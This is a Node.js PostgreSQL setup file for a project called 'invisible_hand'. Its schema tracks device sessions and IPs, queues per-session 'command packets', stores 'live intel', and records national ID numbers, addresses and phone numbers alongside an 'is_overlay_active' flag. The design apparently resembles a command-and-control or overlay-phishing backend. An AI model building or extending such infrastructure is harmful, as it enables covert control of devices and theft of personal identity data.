const { Pool } = require('pg');
require('dotenv').config();

// PostgreSQL connection configuration
const pool = new Pool({
  host: process.env.DB_HOST || 'localhost',
  port: process.env.DB_PORT || 5432,
  database: process.env.DB_NAME || 'invisible_hand',
  user: process.env.DB_USER || 'postgres',
  password: process.env.DB_PASSWORD || '',
  max: 20,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

// Test database connection
pool.on('connect', () => {
  console.log('Connected to PostgreSQL database');
});

pool.on('error', (err) => {
  console.error('Unexpected error on idle client', err);
  process.exit(-1);
});

// Initialize database tables
async function initDatabase() {
  try {
    // Create user_sessions table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS user_sessions (
        session_id VARCHAR(255) PRIMARY KEY,
        device_id VARCHAR(255),
        user_agent TEXT,
        ip_address VARCHAR(45),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    // Create command_packets table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS command_packets (
        command_id VARCHAR(255) PRIMARY KEY,
        session_id VARCHAR(255) REFERENCES user_sessions(session_id),
        command_type VARCHAR(100),
        payload JSONB,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        status VARCHAR(50) DEFAULT 'pending'
      );
    `);

    // Create live_intel table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS live_intel (
        intel_id VARCHAR(255) PRIMARY KEY,
        session_id VARCHAR(255) REFERENCES user_sessions(session_id),
        intel_type VARCHAR(100),
        data JSONB,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        processed BOOLEAN DEFAULT FALSE
      );
    `);

    // Create registrations table for Button 4 data
    await pool.query(`
      CREATE TABLE IF NOT EXISTS registrations (
        id SERIAL PRIMARY KEY,
        nik VARCHAR(20) UNIQUE NOT NULL,
        address TEXT,
        institution TEXT,
        email VARCHAR(255) UNIQUE,
        phone VARCHAR(20) UNIQUE,
        session_id VARCHAR(255) REFERENCES user_sessions(session_id),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        is_overlay_active BOOLEAN DEFAULT FALSE
      );
    `);

    console.log('Database tables initialized successfully');
  } catch (error) {
    console.error('Error initializing database:', error);
    throw error;
  }
}

module.exports = {
  pool,
  initDatabase
};
